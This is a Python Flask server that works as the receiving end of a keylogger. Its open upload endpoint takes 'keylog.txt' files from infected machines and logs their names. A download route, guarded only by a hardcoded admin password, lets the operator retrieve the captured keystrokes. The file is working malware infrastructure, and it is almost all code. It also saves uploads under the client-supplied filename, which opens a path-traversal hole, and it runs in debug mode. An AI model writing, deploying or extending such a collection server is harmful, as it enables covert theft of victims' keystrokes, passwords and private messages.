import os
from urllib import request
from flask import Flask, jsonify, request, send_from_directory
from flask_httpauth import HTTPBasicAuth

app = Flask(__name__)
auth = HTTPBasicAuth()
if not os.path.exists("uploads"):
    os.mkdir("uploads")
users = {"admin" : "KoiZnaiBe"}

@auth.get_password
def get_pw(username):
    if username in users:
        return users[username]
    return None

@app.route('/')
def home():
    return "Welcome"
@app.route('/upload', methods=['POST'])
def upload_keylog():
    if "file" not in request.files:
        return jsonify({"error": "No keylog.txt file"})
    keylog = request.files['file']
    if keylog.filename == '':
            return jsonify({"error": "No keylog.txt file"})
    fl = keylog.filename
    save_path0 = os.path.join("uploads", keylog.filename)
    save_path1 = os.path.join("uploads", "files.txt")
    if not os.path.exists(save_path0):
        with open(save_path1, "a") as filelog:
            filelog.write(f"{keylog.filename} \n")
            filelog.flush()
    if os.path.exists(f"uploads/{fl}"):
        os.remove(f"uploads/{fl}")

    keylog.save(save_path0)
    return jsonify({"success": True, "filename": keylog.filename})

@app.route('/download/<filename>',methods = ['GET'])
@auth.login_required
def download_file(filename):
    # Make sure the file exists in the 'uploads' directory
    if filename == "list":
        return send_from_directory('uploads', "files.txt", as_attachment=True)
    if os.path.exists(os.path.join('uploads', filename)):
        return send_from_directory('uploads', filename, as_attachment=True)
    else:
        return jsonify({"error": "File not found"}), 404
if __name__ == "__main__":
    app.run(debug=True)